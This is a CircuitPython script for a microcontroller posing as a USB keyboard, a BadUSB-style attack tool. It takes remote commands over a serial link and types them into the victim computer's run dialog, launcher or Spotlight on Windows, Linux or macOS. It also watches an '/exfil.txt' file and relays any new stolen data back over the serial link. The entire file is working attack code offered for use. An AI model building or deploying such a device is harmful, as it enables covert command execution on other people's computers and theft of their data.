import time
import board
import busio
import usb_hid
import os
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)
uart = busio.UART(board.GP0, board.GP1, baudrate=115200, timeout=0.1)

EXFIL_FILE = "/exfil.txt"
last_checked_size = 0


def run_macro(os_type, command_arg):
    if os_type == "WIN" or os_type == "LINUX":
        keyboard.send(Keycode.GUI)
        time.sleep(0.6)
        layout.write(command_arg)
        time.sleep(0.4)
        keyboard.send(Keycode.ENTER)

    elif os_type == "MAC":
        # trigger spotlight search via Cmd + Space
        keyboard.press(Keycode.COMMAND)
        keyboard.press(Keycode.SPACE)
        time.sleep(0.05)
        keyboard.release_all()

        time.sleep(0.6)  #wait for spotlight UI to render
        layout.write(command_arg)
        time.sleep(0.4)
        keyboard.send(Keycode.ENTER)


def check_for_exfil():
    global last_checked_size
    try:
        if EXFIL_FILE in os.listdir("/"):
            stats = os.stat(EXFIL_FILE)
            current_size = stats[6]
            if current_size > last_checked_size:
                with open(EXFIL_FILE, "r") as f:
                    f.seek(last_checked_size)
                    new_data = f.read()
                    if new_data:
                        uart.write(f"[EXFIL]: {new_data}\n".encode())
                last_checked_size = current_size
    except Exception:
        pass


while True:
    data = uart.readline()
    if data:
        try:
            command = data.decode("utf-8").strip()

            if command.startswith("LAUNCH_WIN "):
                run_macro("WIN", command[11:])
            elif command.startswith("LAUNCH_LINUX "):
                run_macro("LINUX", command[13:])
            elif command.startswith("LAUNCH_MAC "):
                run_macro("MAC", command[11:])
            elif command.startswith("TYPE "):
                layout.write(command[5:])
            elif command == "PRESS ENTER":
                keyboard.send(Keycode.ENTER)
            elif command == "PRESS GUI":
                keyboard.send(Keycode.GUI)
            elif command == "DELAY":
                time.sleep(0.5)
        except Exception:
            pass

    check_for_exfil()
    time.sleep(0.02)